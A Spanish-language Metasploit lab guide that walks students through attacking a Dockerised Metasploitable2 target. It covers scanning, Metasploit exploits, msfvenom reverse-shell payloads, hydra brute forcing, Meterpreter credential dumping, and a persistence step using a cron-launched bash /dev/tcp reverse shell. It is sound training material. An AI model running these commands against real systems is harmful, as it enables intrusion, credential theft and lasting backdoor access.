# 🦸 Unit 5: Pentesting Autónomo con Metasploit - LAB PRÁCTICO

## 📋 Requisitos Previos

### Software Requerido
- **Docker** y **Docker Compose**
- **Cliente SSH**
- **Metasploit Framework** (incluido en Kali)

### Conocimientos Recomendados
- Conceptos de explotación de vulnerabilidades
- Comandos básicos de Linux
- Qué es un reverse shell y bind shell
- Conceptos de arquitectura de exploits

---

## 🎯 Objetivos de Aprendizaje

1. ✅ **Usar** Metasploit Framework efectivamente
2. ✅ **Escanear** y encontrar vulnerabilidades
3. ✅ **Explotar** servicios vulnerables
4. ✅ **Obtener acceso** mediante diferentes vectores
5. ✅ **Escalar privilegios** en el sistema objetivo
6. ✅ **Realizar** post-explotación básica

---

## 🏗️ Arquitectura del Laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 5                                │
│                    PENTESTING AUTÓNOMO                              │
├──────────────────────────────────────────────────────────────────┤
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │  METASPLOI  │      │
│   │   LINUX    │  ──────────────────────→  │   TABLE 2   │      │
│   │ (Atacante) │                            │             │      │
│   │192.168.60.2│                           │192.168.60.3│      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • Metasploit                            │              │
│        │  • msfvenom                            │              │
│        │  • Nmap                                │              │
│        │  • hydra                              │              │
│        │                                          │              │
│        │        SERVICIOS VULNERABLES:           │              │
│        │        FTP:21  SSH:22  Telnet:23      │              │
│        │        SMTP:25  HTTP:80               │              │
│        │        MySQL:3306  PostgreSQL:5432    │              │
│        │        VNC:5900  IRC:6667             │              │
│        │            RED: 192.168.60.0/24     │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
     SSH:2222
```

---

## 🚀 INSTRUCCIONES DETALLADAS

### Paso 1: Iniciar el Laboratorio

```bash
cd docker-labs/unit5
docker-compose up -d

# Verificar que esté corriendo
docker ps
```

### Paso 2: Conectar a Kali

```bash
ssh root@localhost -p 2222
# Password: toor
```

### Paso 3: Obtener IP del Objetivo

```bash
# Desde Kali
nmap -sn 192.168.60.0/24

# O ver IPs directamente
docker network inspect docker-labs_unit5_lab-network | grep IPv4Address
```

---

## ⚔️ EJERCICIOS DE ATAQUE - GUÍA DETALLADA

### Ejercicio 1: Reconocimiento y Escaneo

**Duración**: 20 minutos

**Objetivo**: Identificar servicios y vulnerabilidades

#### 1.1 Escaneo Básico

```bash
# Descubrir hosts
nmap -sn 192.168.60.0/24

# Escaneo rápido
nmap -F 192.168.60.3

# Escaneo completo
nmap -p- 192.168.60.3
```

#### 1.2 Escaneo con Detección de Servicios

```bash
# Detectar versiones
nmap -sV 192.168.60.3

# Con scripts por defecto
nmap -sC 192.168.60.3

# Completo
nmap -A -p- 192.168.60.3
```

#### 1.3 Guardar Resultados

```bash
# Formato Nmap
nmap -sV -sC -p- 192.168.60.3 -oN scan.txt

# Formato XML (para Metasploit)
nmap -sV -sC -p- 192.168.60.3 -oX scan.xml

# Formato Grepable
nmap -sV -sC -p- 192.168.60.3 -oG scan.gnmap
```

---

### Ejercicio 2: Metasploit - Primeros Pasos

**Duración**: 25 minutos

**Objetivo**: Familiarizarse con Metasploit Framework

#### 2.1 Iniciar Metasploit

```bash
# Iniciar msfconsole
msfconsole

# Ver versión
msf6 > version

# Ver ayuda
msf6 > help
```

#### 2.2 Comandos Básicos

```bash
# Buscar módulos
search type:exploit platform:linux

# Buscar vsftpd
search vsftpd

# Ver información de un exploit
info exploit/unix/ftp/vsftpd_234_backdoor

# Usar un exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Ver opciones
show options

# Configurar target
set RHOSTS 192.168.60.3

# Ejecutar
run
```

#### 2.3 Flujo de Trabajo Básico

```bash
msf6 > search type:exploit vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.60.3
msf6 > set RPORT 21
msf6 > run

# Si tiene éxito, obtener shell:
meterpreter > shell
```

---

### Ejercicio 3: Explotación de Servicios

**Duración**: 30 minutos

**Objetivo**: Explotar vulnerabilidades específicas

#### 3.1 Explotar FTP (vsftpd)

```bash
# Buscar exploit
search vsftpd

# Usar exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.60.3
set RPORT 21
run
```

#### 3.2 Explotar SSH

```bash
# Buscar exploits SSH
search type:exploit ssh

# Probar exploit específico
search openssh
use exploit/multi/ssh/sshexec
set RHOSTS 192.168.60.3
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

#### 3.3 Explotar Telnet

```bash
# Buscar
search type:exploit telnet

# Probar
use exploit/linux/telnet/telnet_backdoor
set RHOSTS 192.168.60.3
set RPORT 23
run
```

#### 3.4 Enumerar con Metasploit

```bash
# Usar módulos auxiliares
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.60.3
run

use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.60.3
run

use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.60.3
run
```

---

### Ejercicio 4: Generación de Payloads

**Duración**: 20 minutos

**Objetivo**: Crear payloads personalizados con msfvenom

#### 4.1 Listar Payloads

```bash
# Listar todos
msfvenom -l payloads

# Solo Linux
msfvenom -l payloads | grep linux

# Solo reverse tcp
msfvenom -l payloads | grep reverse_tcp
```

#### 4.2 Generar Payload Linux

```bash
# Meterpreter reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.60.2 LPORT=4444 -f elf -o shell.elf

# Shell reverse TCP
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.60.2 LPORT=4444 -f elf -o shell.elf

# Bind TCP
msfvenom -p linux/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=4444 -f elf -o shell.elf
```

#### 4.3 Generar Payload Windows

```bash
# Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.60.2 LPORT=4444 -f exe -o shell.exe

# Shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.60.2 LPORT=4444 -f exe -o shell.exe
```

#### 4.4 Generar Payload PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.60.2 LPORT=4444 -f raw -o shell.php
```

---

### Ejercicio 5: Fuerza Bruta

**Duración**: 20 minutos

**Objetivo**: Obtener acceso por fuerza bruta

#### 5.1 SSH con Hydra

```bash
# Instalar hydra si no está
apt-get install -y hydra

# Fuerza bruta SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.60.3 ssh

# Usuario específico
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.60.3 ssh
```

#### 5.2 SSH con Metasploit

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.60.3
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### 5.3 FTP con Hydra

```bash
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt 192.168.60.3 ftp
```

---

### Ejercicio 6: Post-Explotación

**Duración**: 25 minutos

**Objetivo**: Escalar privilegios y gather information

#### 6.1 Comandos Meterpreter

```bash
# Información del sistema
meterpreter > sysinfo

# Usuario actual
meterpreter > getuid

# Cambiar usuario
meterpreter > getprivs

# Ver procesos
meterpreter > ps

# Migrar a otro proceso
meterpreter > migrate <PID>
```

#### 6.2 Escalamiento de Privilegios

```bash
# Buscar exploits de privilegio
background
search type:exploit local linux

# o usar suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

#### 6.3 Recolección de Información

```bash
# Verificar si está en Docker
meterpreter > shell
cat /proc/1/cgroup

# Información de red
meterpreter > ifconfig
meterpreter > route

# Credenciales
meterpreter > load kiwi
meterpreter > creds_all
```

---

### Ejercicio 7: Persistence (Persistencia)

**Duración**: 15 minutos

**Objetivo**: Mantener acceso después de que el sistema se reinicie

#### 7.1 Cron Job

```bash
# Crear script de persistencia
echo "#!/bin/bash" > /tmp/persist.sh
echo "bash -i >& /dev/tcp/192.168.60.2/4444 0>&1" >> /tmp/persist.sh
chmod +x /tmp/persist.sh

# Agregar a crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/persist.sh") | crontab -
```

#### 7.2 SSH Key

```bash
# Generar SSH key
ssh-keygen -t rsa -b 4096

# Agregar al authorized_keys
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

---

## 📋 Checklist de Entrega

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | Escaneo completo de Metasploitable2 | ☐ |
| 2 | Usar msfconsole y comandos básicos | ☐ |
| 3 | Explotar vsftpd | ☐ |
| 4 | Explotar SSH | ☐ |
| 5 | Generar payload con msfvenom | ☐ |
| 6 | Fuerza bruta SSH | ☐ |
| 7 | Obtener meterpreter/shell | ☐ |
| 8 | Escalar privilegios | ☐ |
| 9 | Establecer persistencia | ☐ |
| 10 | Informe de pentest | ☐ |

---

## 🛑 LIMPIEZA

```bash
cd docker-labs/unit5
docker-compose down -v

# Si creaste archivos en el objetivo
# Eliminarlos manualmente
```

---

## ✅ Próximo Laboratorio

- **Unit 6**: Evasión de Defensas
- Aprenderás a evadir antivirus, IDS/IPS, y otras defensas

---

## 📚 Recursos Adicionales

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [msfvenom Cheatsheet](https://netsec.ws/?p=382)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)